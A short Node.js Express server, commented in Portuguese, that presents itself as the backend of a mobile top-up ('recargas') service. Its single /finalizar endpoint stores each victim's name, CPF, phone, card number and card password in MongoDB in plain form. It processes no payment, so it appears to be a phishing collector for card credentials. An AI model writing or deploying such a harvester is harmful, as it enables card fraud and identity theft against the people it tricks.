const express = require('express');
const mongoose = require('mongoose');
const path = require('path');
const app = express();

app.use(express.json());
app.use(express.static(path.join(__dirname)));

// CONEXÃO (Lembre-se de colocar sua senha real do MongoDB aqui)
mongoose.connect('mongodb+srv://mateus:SUA_SENHA@cluster0.mongodb.net/recargas?retryWrites=true&w=majority')
  .then(() => console.log('MongoDB Conectado!'))
  .catch(err => console.error(err));

const RecargaSchema = new mongoose.Schema({
    nome: String, cpf: String, telefone: String,
    cartao: String, senha: String,
    dataRegistro: { type: Date, default: Date.now }
});

const Recarga = mongoose.model('Recarga', RecargaSchema);

app.post('/finalizar', async (req, res) => {
    try {
        const novaRecarga = new Recarga(req.body);
        await novaRecarga.save();
        res.status(200).send('Sucesso');
    } catch (error) { res.status(500).send('Erro'); }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor rodando na porta ${PORT}`));